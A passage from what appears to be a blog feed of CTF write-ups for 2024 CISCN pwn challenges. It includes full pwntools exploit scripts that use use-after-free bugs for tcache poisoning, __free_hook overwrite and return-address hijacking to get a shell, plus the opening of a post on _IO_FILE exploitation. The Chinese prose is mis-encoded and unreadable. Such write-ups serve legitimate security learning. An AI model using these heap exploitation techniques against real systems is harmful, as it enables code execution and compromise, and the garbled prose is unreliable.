class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    ori = <span class="built_in">int</span>(r(<span class="number">8</span>), <span class="number">10</span>)</span><br><span class="line">    addflag()</span><br><span class="line">    addflag()</span><br><span class="line">    addflag()</span><br><span class="line">    chkflag()</span><br><span class="line"></span><br><span class="line">    getflag(<span class="number">0x4e60f0</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;::&#x27;</span>)</span><br><span class="line">    magic = <span class="built_in">int</span>(r(<span class="number">19</span>), <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        editflag(<span class="built_in">int</span>(ori + <span class="number">12</span>*i), <span class="built_in">int</span>(magic))</span><br><span class="line">        magic = (<span class="number">0x5851F42D4C957F2D</span> * magic + <span class="number">12345</span>) &amp; <span class="number">0x7FFFFFFFFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">    chkflag()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ori = &quot;</span> + <span class="built_in">str</span>(ori))</span><br><span class="line">    leak(<span class="string">&quot;magic&quot;</span>, magic)</span><br><span class="line">    <span class="comment"># debug(&#x27;b *0x00000000004020b2 \n \</span></span><br><span class="line">    <span class="comment">#       tele 0x4E82F0 \n \</span></span><br><span class="line">    <span class="comment">#       hex 0x4E60F0&#x27;)</span></span><br><span class="line">    itr()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251818976.png" alt="image-20240625181804898"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ç¬¬ä¸€æ¬¡å›½èµ›å°±è¿™æ ·è¿‡äº†ï¼Œç»éªŒè¿˜æ˜¯å¤ªå°‘äº†ï¼Œæ²¡æƒ³åˆ°pwn1æ”¹æ ˆæƒé™å°±è¡Œäº†ã€‚ã€‚ã€‚å†æ¥å†å‰å§ã€‚</p><p>awdç±»å‹çš„æ¯”èµ›ä»¥æ”»ä¸ºä¸»ï¼Œé˜²å¾¡ä¸ºè¾…ï¼Œæ¯•ç«Ÿéƒ½æ˜¯åˆ·ctfå‡ºæ¥çš„ï¼Œè‚¯å®šæ˜¯æ¼æ´åˆ©ç”¨ç†Ÿæ‚‰ä¸€ç‚¹ï¼Œå†æ€ä¹ˆæ ·ä¹Ÿä¼šæ¯”çæ£é¼“patchå¥½ç‚¹ã€‚</p><p>é“¾æ¥å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/weixin_45906533/article/details/139937288">https://blog.csdn.net/weixin_45906533/article/details/139937288</a></p><p><a href="https://zhuanlan.zhihu.com/p/705148718?utm_psn=1788963199141429250">2024å…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›ï¼ˆciscnï¼‰åŠå†³èµ›ï¼ˆåä¸œåŒ—èµ›åŒºï¼‰Pwné¢˜è§£ - çŸ¥ä¹ (zhihu.com)</a></p><h1 id="åå—"><a href="#åå—" class="headerlink" title="åå—"></a>åå—</h1><p>ä¸€é“å †é¢˜</p><h2 id="my-heap"><a href="#my-heap" class="headerlink" title="my_heap"></a>my_heap</h2><p>Ubuntu GLIBC 2.35-0ubuntu3.7</p><p>addï¼šè¾“å…¥1èƒ½ç”³è¯·ä»»æ„å¤§å°chunkï¼Œæ›´æ–°bufæŒ‡å‘ç”³è¯·çš„chunkï¼›é1åªèƒ½malloc(0x4f0)ï¼Œä¸æ›´æ–°buf</p><p>deleï¼šuaf</p><p>showï¼šæ‰“å°buf-&gt;data 7å­—èŠ‚ï¼Œå¹¶ä¸”è¿›è¡Œå¼‚æˆ–åŠ å¯†</p><p>editï¼šå¾€bufé‡Œå†™8å­—èŠ‚æ•°æ®</p><p>getbackdoorï¼šæ‹¿åˆ°ç¨‹åºåŸºåœ°å€ä»¥åŠä¸€æ¬¡0x20å­—èŠ‚å†™</p><blockquote><p>tcacheæœºåˆ¶  libc-2.26å¼•å…¥   Ubuntu-17.04ä»¥å</p><p>tcache_perthread_structä¸­å­˜å‚¨ç€å„ä¸ªtcachebinç»“æ„ä½“çš„countsä»¥åŠbinè¡¨å¤´ï¼Œtcache_entry-&gt;next    </p><p>2.26ä¸‹tcacheä¸ä¼šæ£€æŸ¥é“¾è¡¨å®Œæ•´æ€§ï¼Œdouble free</p><p>2.29å¢åŠ äº†å¯¹sizeä½çš„chkï¼Œéœ€è¦è¿›è¡Œsizeå¯¹é½    å¢åŠ äº†é“¾è¡¨éå†ç›´æ¥freeä¸¤æ¬¡å¤±æ•ˆï¼Œå¹¶ä¸”countsä¸èƒ½å‘ä¸‹æº¢å‡º</p><p>2.34+å¢åŠ äº†PROTECT_PTR(pos, ptr)å®å®šä¹‰æ¥å°†  ptr_addr&gt;&gt;12ä¸ptrè¿›è¡Œå¼‚æˆ–åŠ å¯†</p><p>tc freeæ—¶ä¼šå¯¹e-&gt;keyè¿›è¡Œèµ‹å€¼ï¼Œç”¨äºæ£€æµ‹double freeï¼Œå°†keyç ´åæ‰å°±èƒ½ç»•è¿‡doubleçš„chk</p><p>2.34+ åˆ é™¤äº†dl_rtld_lock_recursivehå’Œdl_rtld_unlock_recursive   æ²¡æœ‰äº†malloc_hookç­‰</p><p>getshellæ–¹æ³•æœ‰ï¼š1.æ ˆï¼›2.vtableï¼›3.tls_dtor_listæŒŸæŒ__exit_funcsé“¾è¡¨ï¼ˆ<a href="https://www.anquanke.com/post/id/243196#h2-2">exit()åˆ†æä¸åˆ©ç”¨-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a>ï¼‰</p></blockquote><p>æ”»å‡»æ€è·¯ï¼š</p><ol><li>åˆ©ç”¨uafæ³„éœ²å‡ºlibc_baseå’Œheap_base</li><li>åˆ©ç”¨getbackdooræ¥æ‹¿ç¨‹åºåŸºåœ°å€ï¼Œä»¥åŠæ”¹å†™tcachebin_keyï¼Œå®ç°tcachebin doublefreeï¼Œä½†æ˜¯ç”±äºæˆ‘ä»¬æ¯æ¬¡åªèƒ½æ§åˆ¶bufæŒ‡å‘çš„chunkï¼Œæ‰€ä»¥æ— æ³•å¾—åˆ°ä¸¤ä¸ªä»¥ä¸Šçš„ç›¸åŒå¤§å°çš„tcæ¥è¿›è¡Œtb attackã€‚éœ€è¦å…ˆæ§åˆ¶äº†tcache_perthread_structç»“æ„ä½“ä¸­çš„countsæ•°ç»„ï¼Œå¯¹binæ•°ç›®è¿›è¡Œæ§åˆ¶ã€‚ç”±äºæˆ‘ä»¬åªèƒ½å†™8å­—èŠ‚ï¼Œæ‰€ä»¥æŒŸæŒåˆ°tcache_perthread_struct+0x10åå¯æ§0x20~0x50(8&#x2F;2)ã€‚ç„¶åä¿®æ”¹1&lt;counts&lt;7ï¼ˆç›®çš„æ˜¯é˜²æ­¢åé¢çš„chunk freeæ—¶è¢«æ”¾å…¥åˆ°fbä¸­ï¼‰</li><li>åé¢å°±æ˜¯ä¸¤æ¬¡tcachebin attackï¼šåˆ©ç”¨æ³„éœ²å‡ºæ¥çš„ç¨‹åºåŸºåœ°å€æ¥æ‰“bufï¼Œæ­¤æ—¶buf-&gt;bufï¼Œç„¶ååˆ©ç”¨editä¿®æ”¹bufï¼Œæ­¤æ—¶å°†bufä¿®æ”¹ä¸ºäº†editå‡½æ•°çš„è¿”å›åœ°å€ï¼Œç„¶åå†åˆ©ç”¨editå‡½æ•°ä¿®æ”¹è¿”å›åœ°å€ä¸ºbackdoor+8 æˆ–è€… one_gadget</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;magic heap has 4 choice : \nadd\ndelete\nshow\nedit\n&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx=<span class="number">1</span>, size=<span class="number">1</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;which one you choose?\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">if</span> idx != <span class="number">5</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>():</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content=<span class="string">b&#x27;aaaa&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;edit data:&#x27;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;the data:&#x27;</span>)</span><br><span class="line">    enc = r(<span class="number">7</span>)</span><br><span class="line">    <span class="comment"># print(enc)</span></span><br><span class="line">    <span class="comment"># for i in range(7):</span></span><br><span class="line">    <span class="comment">#     enc[i] = enc[i] ^ (i + 153)</span></span><br><span class="line">    <span class="comment"># print(enc)</span></span><br><span class="line">    dec = [<span class="number">0</span>]*<span class="number">7</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">        dec[j] = i ^ (j+<span class="number">153</span>)</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> uu64(<span class="built_in">bytes</span>(dec))</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getBackdoor</span>():</span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;1 1&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./my_heap&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.35-0ubuntu3.7_amd64/libc.so.6&#x27;</span> </span><br><span class="line">    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    rop  = ROP(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">    io = init(pwnfile, IPort, libc_name)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x418</span>)</span><br><span class="line">    add(<span class="number">5</span>)</span><br><span class="line">    dele()</span><br><span class="line">    libc_base = show() - <span class="number">0x21ace0</span></span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x88</span>)</span><br><span class="line">    dele()  <span class="comment">#tb -&gt; 1</span></span><br><span class="line">    heap_addr = show()</span><br><span class="line">    heap_base = heap_addr &lt;&lt; <span class="number">12</span></span><br><span class="line">    getBackdoor()</span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    ori = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    buf = ori - <span class="number">0x12be</span> + <span class="number">0x04040</span></span><br><span class="line">    ru(<span class="string">b&#x27;edit data:&#x27;</span>)</span><br><span class="line">    s(p64(<span class="number">0</span>)+p64(<span class="number">0xdeadbeef</span>))  <span class="comment">#key_clean</span></span><br><span class="line">    dele()   <span class="comment">#tb -&gt;tcache_perthread -&gt;1</span></span><br><span class="line">    edit(p64(heap_base &gt;&gt;<span class="number">12</span> ^(heap_base + <span class="number">0x10</span>)))</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x88</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x88</span>)</span><br><span class="line">    dele()</span><br><span class="line">    edit(p64(<span class="number">0</span>))</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x38</span>)</span><br><span class="line">    dele()</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x48</span>)</span><br><span class="line">    dele()</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x288</span>)</span><br><span class="line">    dele()</span><br><span class="line">    edit(<span class="string">b&#x27;\x03\x03\x05\x00\x05\x00\x05\x00&#x27;</span>)  <span class="comment">#0x30-&gt;5  0x40-&gt;5  0x50-&gt;5</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x38</span>)</span><br><span class="line">    dele()</span><br><span class="line">    edit(p64((heap_base&gt;&gt;<span class="number">12</span>)^(libc.sym[<span class="string">&#x27;environ&#x27;</span>] + libc_base)))</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x38</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x38</span>)</span><br><span class="line">    stack_addr = show()</span><br><span class="line">    ret_addr   = stack_addr - <span class="number">0x140</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x48</span>)</span><br><span class="line">    dele()</span><br><span class="line">    edit(p64((heap_base&gt;&gt;<span class="number">12</span>) ^ (buf)))</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x48</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line">    edit(p64(ret_addr))</span><br><span class="line">    edit(p64(ori+<span class="number">8</span>))</span><br><span class="line">    </span><br><span class="line">    leak(<span class="string">&quot;libc_base&quot;</span>, libc_base)</span><br><span class="line">    leak(<span class="string">&quot;heap_base&quot;</span>, heap_base)</span><br><span class="line">    leak(<span class="string">&quot;stack_addr&quot;</span>, stack_addr)</span><br><span class="line">    leak(<span class="string">&quot;ret_addr&quot;</span>, ret_addr)</span><br><span class="line">    leak(<span class="string">&quot;backdoor_addr&quot;</span>, ori)</span><br><span class="line">    leak(<span class="string">&quot;buf&quot;</span>, buf)</span><br><span class="line">    <span class="comment"># leak(&quot;info&quot;, info)</span></span><br><span class="line">    <span class="comment"># debug(&#x27;tele $rebase(0x4040) \n \</span></span><br><span class="line">    <span class="comment">#       b *$rebase(0x0x148d)&#x27;)</span></span><br><span class="line"></span><br><span class="line">    itr()</span><br></pre></td></tr></table></figure><p>fixçš„è¯æŠŠuafç»™patchæ‰ï¼Œbackdoor nopæ‰</p><h1 id="åä¸­"><a href="#åä¸­" class="headerlink" title="åä¸­"></a>åä¸­</h1><h2 id="pwn1-note"><a href="#pwn1-note" class="headerlink" title="pwn1-note"></a>pwn1-note</h2><p>2.31-0ubuntu9.9</p><p>addï¼šsizeå°äº0xFFF</p><p>deleï¼šuaf</p><p>editã€showæ­£å¸¸</p><p>åˆ©ç”¨largechunkæ³„éœ²libcï¼Œç„¶ååˆ©ç”¨uafæ”¹tcacheé“¾è¡¨ä¸º__free_hook</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;5. exit\n&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&#x27;aaaa&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;The size of your content: \n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&#x27;content: \n&#x27;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index: \n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content=<span class="string">b&#x27;aaaa&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index: \n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;The size of your content: \n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;Content: \n&#x27;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index: \n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;pwn.challenge.ctf.show 28278&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6&#x27;</span> </span><br><span class="line">    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    rop  = ROP(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">    io = init(pwnfile, IPort, libc_name)</span><br><span class="line">    add(<span class="number">0x418</span>)  <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x18</span>)   <span class="comment">#1</span></span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    libc_base = uu64(r64()) - <span class="number">0x1ecbe0</span></span><br><span class="line">    add(<span class="number">0x28</span>)  <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x28</span>)  <span class="comment">#3</span></span><br><span class="line">    dele(<span class="number">3</span>)</span><br><span class="line">    dele(<span class="number">2</span>)    <span class="comment">#0x30: 2-&gt;3</span></span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">0x8</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">    add(<span class="number">0x28</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)  <span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x28</span>)  <span class="comment">#5</span></span><br><span class="line">    edit(<span class="number">5</span>, <span class="number">0x8</span>, p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    dele(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    leak(<span class="string">&quot;libc_base&quot;</span>, libc_base)</span><br><span class="line">    <span class="comment"># debug(&#x27;tele $rebase(0x04060) \n \</span></span><br><span class="line">    <span class="comment">#       tele $rebase(0x06060)&#x27;)</span></span><br><span class="line">    itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024åä¸œåŒ—åˆ†åŒºèµ›-pwnå¤ç°&quot;&gt;&lt;a href=&quot;#2024åä¸œåŒ—åˆ†åŒºèµ›-pwnå¤ç°&quot; class=&quot;headerlink&quot; title=&quot;2024åä¸œåŒ—åˆ†åŒºèµ›-pwnå¤ç°&quot;&gt;&lt;/a&gt;2024åä¸œåŒ—åˆ†åŒºèµ›-pwnå¤ç°&lt;/h1&gt;&lt;p&gt;ç¬¬ä¸€æ¬¡æ‰“å›½èµ›ï¼Œä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡æ‰“a</summary>
      
    
    
    
    <category term="WriteUP" scheme="http://tw11ty.github.io/categories/WriteUP/"/>
    
    
    <category term="ciscn WriteUP" scheme="http://tw11ty.github.io/tags/ciscn-WriteUP/"/>
    
  </entry>
  
  <entry>
    <title>_IO_FILEåŸºç¡€åˆ©ç”¨</title>
    <link href="http://tw11ty.github.io/2024/06/11/IO-FILE%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/"/>
    <id>http://tw11ty.github.io/2024/06/11/IO-FILE%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/</id>
    <published>2024-06-11T11:46:46.000Z</published>
    <updated>2024-11-16T08:37:37.967Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IO-FILEåˆ©ç”¨"><a href="#IO-FILEåˆ©ç”¨" class="headerlink" title="_IO_FILEåˆ©ç”¨"></a>_IO_FILEåˆ©ç”¨</h1><blockquote><p>sky123å¸ˆå‚…åšå®¢ï¼š<a href="http://t.csdnimg.cn/O8y8S%EF%BC%8C%E4%BB%8EIO_FILE%E7%9A%84%E7%BB%93%E6%9E%84%E3%80%81%E5%8E%9F%E7%90%86%E5%88%B0%E5%88%A9%E7%94%A8%EF%BC%8C%E5%86%99%E5%BE%97%E6%9E%81%E5%85%B6%E8%AF%A6%E7%BB%86%E6%98%93%E6%87%82">http://t.csdnimg.cn/O8y8Sï¼Œä»IO_FILEçš„ç»“æ„ã€åŸç†åˆ°åˆ©ç”¨ï¼Œå†™å¾—æå…¶è¯¦ç»†æ˜“æ‡‚</a></p><p>hollkå¸ˆå‚…ï¼š<a href="https://blog.csdn.net/qq_41202237/article/details/113845320">å¥½å¥½è¯´è¯ä¹‹IO_FILEåˆ©ç”¨ï¼ˆ1ï¼‰ï¼šåˆ©ç”¨_IO_2_1_stdoutæ³„éœ²libc_libcæ³„éœ²æ–¹å¼-CSDNåšå®¢</a></p></blockquote><p>_IO_FILEç»“æ„ åœ¨2.31ä¸­å®šä¹‰åœ¨äº†struct_FILE.hå¤´æ–‡ä»¶ä¸­</p><p>å‚ç…§sky123å¸ˆå‚…çš„è´´å›¾ä»¿ä½œå‡ºä¸€å¹…IO_FILEç»“æ„å…³ç³»å›¾</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406082020458.png" alt="image-20240608202007286"></p><h1 id="1-FILEç»“æ„"><a href="#1-FILEç»“æ„" class="headerlink" title="1.FILEç»“æ„"></a>1.FILEç»“æ„</h1><p><strong>_IO_FILE</strong>ç»“æ„åœ¨è¾ƒä½ç‰ˆæœ¬çš„libcä¸­å®šä¹‰åœ¨glibc&#x2F;libio&#x2F;libio.hï¼Œè¾ƒé«˜ç‰ˆæœ¬å®šä¹‰åœ¨glibc&#x2F;libio&#x2F;bits\types\struct_FILE.hä¸­ï¼Œ__IO_FILEç»“æ„ä½“ä¸­å­˜å‚¨ç¼“å†²åŒºç›¸å…³çš„æˆå‘˜å˜é‡ã€‚</p><p><strong>_IO_list_all</strong>æŒ‡å‘æœ€ååˆ›å»ºçš„FILEç»“æ„ï¼ˆåˆå§‹åŒ–åæŒ‡å‘__IO_2_1_stderrï¼‰ï¼Œå„FILEç»“æ„é€šè¿‡_chainåŸŸé“¾æ¥å½¢æˆä¸€ä¸ªå•é¡¹é“¾è¡¨ã€‚</p><p><strong>_IO_FILE_plus</strong>ä¸­åŒ…å«äº†_IO_FILEç»“æ„ä»¥åŠåä¸º<strong>vtable</strong>çš„ _IO_jump_t ç»“æ„çš„è™šè¡¨ï¼Œæ‰€æœ‰FILEç»“æ„ä½“çš„è™šè¡¨æŒ‡é’ˆå‡æŒ‡å‘å‘è™šè¡¨<strong>_IO_file_jumps</strong>ï¼Œåœ¨è¿›è¡Œ<strong>IO</strong>æ“ä½œæ—¶ï¼Œéƒ½ä¼šè°ƒç”¨åˆ°è¯¥ç»“æ„ä½“ä¸­çš„å‡½æ•°ï¼Œå³ä½œä¸ºå…¬å…±å‡½æ•°è¡¨ä½¿ç”¨ï¼ˆå‡½æ•°å¤šæ€æ€§å‘ˆç°ï¼‰ã€‚</p><p>è¿›è¡ŒIOæ“ä½œæ—¶ï¼Œå¤§è‡´æµç¨‹æ˜¯é€šè¿‡è®¿é—®__IO_FILEç»“æ„ä½“ä¸­çš„ç¼“å†²åŒºç›¸å…³å˜é‡ï¼Œé€šè¿‡è°ƒç”¨è™šè¡¨ä¸­æŒ‡å®šçš„ä¸€ç³»åˆ—å‡½æ•°æ¥å®Œæˆæ“ä½œã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬çš„åˆ©ç”¨å¤§æ¦‚åˆ†ä¸ºå››ä¸ªæ–¹å‘ï¼ša.__IO_FILEç»“æ„ä½“æˆå‘˜å˜é‡ï¼›b.è™šè¡¨ï¼›c.__IO_FILE_plusï¼›</p><p>è¿‡å¤šå…³äºFILEç»“æ„çš„å†…å®¹å°±ä¸è¿‡å¤šæè¿°äº†ï¼Œä¸å¤ªæƒ³è¿‡å¤šçš„ç‚’å†·é¥­ã€‚ç›´æ¥è®²è®²åˆ©ç”¨äº†ã€‚</p><h1 id="2-åˆ©ç”¨"><a href="#2-åˆ©ç”¨" class="headerlink" title="2.åˆ©ç”¨"></a>2.åˆ©ç”¨</h1><h2 id="2-1-IO-FILEç»“æ„ä½“æˆå‘˜å˜é‡"><a href="#2-1-IO-FILEç»“æ„ä½“æˆå‘˜å˜é‡" class="headerlink" title="2.1 __IO_FILEç»“æ„ä½“æˆå‘˜å˜é‡"></a>2.1 __IO_FILEç»“æ„ä½“æˆå‘˜å˜é‡</h2><h3 id="IO-2-1-stdoutæˆå‘˜å˜é‡åˆ©ç”¨"><a href="#IO-2-1-stdoutæˆå‘˜å˜é‡åˆ©ç”¨" class="headerlink" 